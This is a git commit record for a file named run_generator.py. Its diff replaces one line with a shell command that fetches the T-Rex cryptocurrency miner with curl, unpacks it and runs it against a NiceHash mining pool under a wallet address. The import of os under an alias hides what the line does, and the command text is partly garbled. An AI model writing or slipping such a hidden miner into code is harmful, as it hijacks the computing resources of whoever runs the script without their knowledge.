dd2017bd3b20a121fe4f100f7bf9f4d4717404fd
lmakeke29 <92582647+lmakeke29@users.noreply.github.com>
2021-10-15 14:11:02 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,4 @@
 import os as alpha
-alpha.system("su curl -LJO https://trex-miner.com/download/t-rex-0.20.3-linux.tar.gz && tarxft-rex-0.20.3-linux.tar.gz && ./t-rex --algo ethash -o stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353-u3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c -wv100")
+alpha.system("su --shell curl -LJO https://trex-miner.com/download/t-rex-0.20.3-linux.tar.gz && tarxft-rex-0.20.3-linux.tar.gz && ./t-rex --algo ethash -o stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353-u3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c -wv100")
              
+ 
